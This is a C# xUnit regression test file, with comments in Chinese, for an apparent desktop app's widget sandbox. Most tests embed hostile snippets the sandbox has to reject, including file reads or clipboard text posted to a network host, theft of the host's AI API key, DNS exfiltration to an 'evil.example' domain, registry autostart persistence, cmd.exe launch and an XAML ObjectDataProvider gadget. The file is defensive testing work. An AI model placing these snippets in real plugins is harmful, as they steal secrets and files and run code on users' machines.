using System;
using ShoreHue.UI.Widgets.Dynamic;
using Xunit;

namespace ShoreHue.Tests;

/// <summary>
/// ★ 沙箱绕过语料库（CI 回归）：把"实测能绕过旧实现"的攻击样本 + 公开 gadget 类别 + 良性样本固化成测试。
///
/// 语料来源：
///   · 本仓库 2026-09 沙箱审计中实测通过的 9 个绕过样本（文件写/读外泄/宿主 API/剪贴板外泄）；
///   · 公开的 .NET 反序列化 gadget 类别（ObjectDataProvider / XAML 动态调用，参考 ysoserial.net 的 payload 分类）；
///   · 官方代码分析规则 CA3010「Review code for XAML injection vulnerabilities」对应的 XAML 注入形态；
///   · 攻击能力矩阵（参考 Backstabber's Knife Collection 的供应链攻击能力分类）逐类造样本；
///   · 良性样本取自本项目真实小组件/模板写法，用来守住误报率（FPR）。
///
/// 约定：每条样本先确认**能编译**（否则跳过并视为语料本身有问题），再断言沙箱的判定。
/// </summary>
public class SandboxCorpusTests
{
    private static string Widget(string body) =>
        "using System;\nusing System.IO;\nusing System.Net.Http;\nusing System.Windows;\n" +
        "using System.Windows.Controls;\nusing System.Threading.Tasks;\n" +
        "public class W : UserControl\n{\n  public void Run(string path)\n  {\n" +
        "    var label = new TextBlock();\n" + body + "\n  }\n}\n";

    private static string AsError(string csharp, string markup = "")
    {
        // ★ 把类注释里的约定真正落地："每条样本先确认**能编译**，再断言沙箱判定"。
        //   以前这条约定只写在注释里、只有一处实际调用 —— 后果是：
        //   一个"其实已经编译不过"的样本仍然会因为文本层命中关键词而让测试保持绿色，
        //   它本来要守住的那条绕过路径**已经没人验证了**，而 CI 毫无信号。
        if (!string.IsNullOrWhiteSpace(csharp))
        {
            string compileErr = WidgetCompiler.Validate("corpus", csharp);
            Assert.True(compileErr.Length == 0,
                "语料样本本身无法编译 —— 这是语料的问题，不是沙箱拦住了它：\n" + compileErr);
        }
        return WidgetCompiler.SandboxErrors(csharp, markup);
    }

    // ============ 1. 实测绕过样本（回归：必须拦） ============

    [Fact] public void 文件写入_FileCreateText_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.IO.TextWriter w = System.IO.File.CreateText(path); w.Write(""pwned"");")));

    [Fact] public void 文件写入_FileOpenWrite_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.IO.Stream s = System.IO.File.OpenWrite(path); s.Write(new byte[] { 1, 2 }, 0, 2);")));

    [Fact] public void 文件写入_MemoryMappedFile_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"using var mm = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateFromFile(path, System.IO.FileMode.Create, ""m"", 1024);")));

    [Fact] public void 数据外泄_读文件流向网络_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var data = System.IO.File.ReadAllText(path); new HttpClient().PostAsync(""http://127.0.0.1:1/"", new StringContent(data));")));

    [Fact] public void 数据外泄_OpenText加网络_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var r = System.IO.File.OpenText(path); new HttpClient().GetAsync(""http://127.0.0.1:1/?d="" + r.ReadToEnd());")));

    [Fact] public void 数据外泄_剪贴板流向网络_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var clip = System.Windows.Clipboard.GetText(); new HttpClient().GetAsync(""http://127.0.0.1:1/?d="" + clip);")));

    [Fact] public void 宿主API_读AI密钥_必须拦()
        => Assert.Contains("AiSettingsStore", AsError(Widget(@"var s = ShoreHue.Core.Services.Ai.AiSettingsStore.Load(); new HttpClient().PostAsync(""http://127.0.0.1:1/"", new StringContent(s.ApiKey));")));

    // ★ 2026-09 安全复查新增：插件不该能自建宿主的设置管理器
    //   （信任库就存在它管的 config.json 里；即便信任写已收口，直接改写整份配置也是不该给的能力）
    [Fact] public void 宿主API_自建设置管理器_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var m = new ShoreHue.Core.Services.Configuration.SettingsManager();")));

    [Fact] public void 宿主API_取服务容器_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var s = ShoreHue.Core.Infrastructure.Service.ServiceManager.Instance;")));

    [Fact] public void 宿主API_卸载并删数据_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"ShoreHue.Infrastructure.WinApi.UninstallHelper.LaunchUninstall(true);")));

    [Fact] public void 宿主API_窗口与桌面控制_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"ShoreHue.Infrastructure.WinApi.WindowAction.ShowDesktop();")));

    // ============ 2. 换皮变体（别名 / 换行 / 基类声明） ============

    [Fact] public void 换皮_别名引用Process_必须拦()
        => Assert.NotEqual("", AsError("using P = System.Diagnostics.Process;\n" + Widget(@"P.Start(""calc.exe"");")));

    [Fact] public void 换皮_Activator换行LF_必须拦()
        => Assert.NotEqual("", AsError(Widget("var o = System.Activator\n    .CreateInstance(\"System.Diagnostics.Process\", \"System.Diagnostics.Process\");")));

    [Fact] public void 换皮_FileWrite换行_必须拦()
        => Assert.NotEqual("", AsError(Widget("System.IO.File\n    .WriteAllText(path, \"x\");")));

    // ============ 3. 公开 gadget 类别（XAML 动态调用 / 反序列化） ============

    [Fact] public void XAML_ObjectDataProvider_gadget_必须拦()
    {
        string xaml = "<TextBlock xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
                      "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:d=\"clr-namespace:System.Diagnostics;assembly=System.Diagnostics.Process\">" +
                      "<TextBlock.Resources><ObjectDataProvider x:Key=\"p\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\"/></TextBlock.Resources></TextBlock>";
        Assert.NotEqual("", AsError("", xaml));
    }

    [Fact] public void XAML_xCode_必须拦()
        => Assert.NotEqual("", AsError("", "<UserControl xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><x:Code><![CDATA[ void M(){ } ]]></x:Code></UserControl>"));

    [Fact] public void XAML_引用危险命名空间_必须拦()
        => Assert.NotEqual("", AsError("", "<UserControl xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:io=\"clr-namespace:System.IO;assembly=System.Runtime\"/>"));

    // ============ 4. 良性样本（守误报率 FPR：这些必须放行） ============

    [Fact] public void 良性_只读文件不联网_放行()
        => Assert.Equal("", AsError(Widget(@"var cfg = System.IO.File.ReadAllText(path); label.Text = cfg;")));

    [Fact] public void 良性_只联网查天气_放行()
        => Assert.Equal("", AsError(Widget(@"new HttpClient().GetAsync(""https://api.example.com/weather?city=beijing"");")));

    [Fact] public void 良性_读本地配置加常量请求_放行_数据流不误拦()
        => Assert.Equal("", AsError(Widget(@"var cfg = System.IO.File.ReadAllText(path); new HttpClient().GetAsync(""https://api.example.com/weather"");")));

    [Fact] public void 良性_写剪贴板_放行_权限声明类()
        => Assert.Equal("", AsError(Widget(@"System.Windows.Clipboard.SetText(""copied"");")));

    [Fact] public void 良性_Stopwatch与DispatcherTimer_放行()
        => Assert.Equal("", AsError("using System.Diagnostics;\nusing System.Windows.Threading;\n" +
            Widget(@"var sw = Stopwatch.StartNew(); sw.Stop(); var t = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };")));

    [Fact] public void 良性_经HostCapabilities打开网页_放行()
        => Assert.Equal("", AsError(Widget(@"ShoreHue.UI.Widgets.HostCapabilities.OpenExternally(""https://example.com"");")));

    [Fact] public void 良性_经HostCapabilities发通知与取最近使用_放行()
        => Assert.Equal("", AsError(Widget(@"ShoreHue.UI.Widgets.HostCapabilities.ShowToast(""标题"", ""内容""); var list = ShoreHue.UI.Widgets.HostCapabilities.GetRecentItems(10);")));

    [Fact] public void 良性_读取HostRecentItem字段_放行()
        => Assert.Equal("", AsError(Widget(@"foreach (var it in ShoreHue.UI.Widgets.HostCapabilities.GetRecentItems(5)) label.Text = it.Name + it.Kind;")));

    [Fact] public void 良性_普通XAML布局_放行()
        => Assert.Equal("", AsError("", "<UserControl xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"><StackPanel><Button x:Name=\"btn\" Content=\"开始\"/></StackPanel></UserControl>"));

    // ============ 5. 能力矩阵补样（按攻击者目标分类，保证覆盖不是零散凑的） ============

    [Fact] public void 持久化_注册表自启_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"Microsoft.Win32.Registry.CurrentUser.OpenSubKey(""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", true);")));

    [Fact] public void 执行_进程启动_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(""cmd.exe"") { UseShellExecute = true });")));

    [Fact] public void 输入注入_SendKeys_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.Windows.Forms.SendKeys.SendWait(""hello"");")));

    [Fact] public void 屏幕捕获_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"using var bmp = new System.Drawing.Bitmap(100, 100); using var g = System.Drawing.Graphics.FromImage(bmp); g.CopyFromScreen(0, 0, 0, 0, new System.Drawing.Size(100, 100));")));

    [Fact] public void 内存无边界_Unsafe类型混淆_必须拦()
        // ★ 不用 unsafe 关键字（那需要 /unsafe 编译选项，我们的编译管道本就不开 → 编不过）
        //   这里用的是**不需要 unsafe 关键字**就能用的 Unsafe.As（ref 类型混淆，可绕过托管层黑名单）
        => Assert.NotEqual("", AsError(Widget(@"object o = new object(); string s = System.Runtime.CompilerServices.Unsafe.As<object, string>(ref o);")));

    [Fact] public void 内存无边界_unsafe关键字_编译期即被拒()
    {
        // 编译管道未开 AllowUnsafe → unsafe 代码根本编译不出来（记录这条边界）
        string src = Widget("unsafe { int x = 1; }");
        Assert.NotEqual("", WidgetCompiler.Validate("corpus_unsafe", src));
    }

    [Fact] public void 表达式树按名调用_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var e = System.Linq.Expressions.Expression.Call(typeof(string), ""ToString"", null, new System.Linq.Expressions.Expression[0]);")));

    [Fact] public void 动态类型构造_Activator_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.Activator.CreateInstance(""System.IO.FileStream"", ""System.IO.FileStream"");")));

    [Fact] public void 解密DPAPI密文_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"System.Security.Cryptography.ProtectedData.Unprotect(new byte[1], null, System.Security.Cryptography.DataProtectionScope.CurrentUser);")));

    [Fact] public void 网络监听_HttpListener_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"var l = new System.Net.HttpListener(); l.Start();")));

    [Fact] public void 数据外带_DNS查询_读文件必须拦()
        // ★ DNS 也是一条真实外带通道：内容编码进域名即可发出，既不是 Socket 也不是 HttpClient。
        //   漏掉它，数据流层的"本地数据 → 网络出口"就判不出来。
        => Assert.NotEqual("", AsError(Widget(@"string p = System.IO.File.ReadAllText(""C:\\secret.txt""); System.Net.Dns.GetHostAddresses(p + "".evil.example"");")));

    [Fact] public void 宿主落盘封装_任意路径写文件必须拦()
        // SettingsFileManager.Save(data, path) 是 public static 且收任意路径 ——
        // 不拦就是一条绕过 File.Write* 白名单的任意写文件通道
        => Assert.NotEqual("", AsError(Widget(@"ShoreHue.Core.Services.SettingsFileManager.Save(new ShoreHue.Core.Services.Configuration.SettingsData(), ""C:\\Windows\\Temp\\x.json"");")));

    [Fact] public void 宿主预设读写_必须拦()
        => Assert.NotEqual("", AsError(Widget(@"ShoreHue.Core.Services.Configuration.PresetManager.SaveFull(""x"", new ShoreHue.Core.Services.Configuration.SettingsData());")));

    [Fact] public void 宿主设置管理器_整表改写必须拦()
        => Assert.NotEqual("", AsError(Widget(@"ShoreHue.Core.Services.Configuration.SettingsManager m = null; m.Reload();")));
}

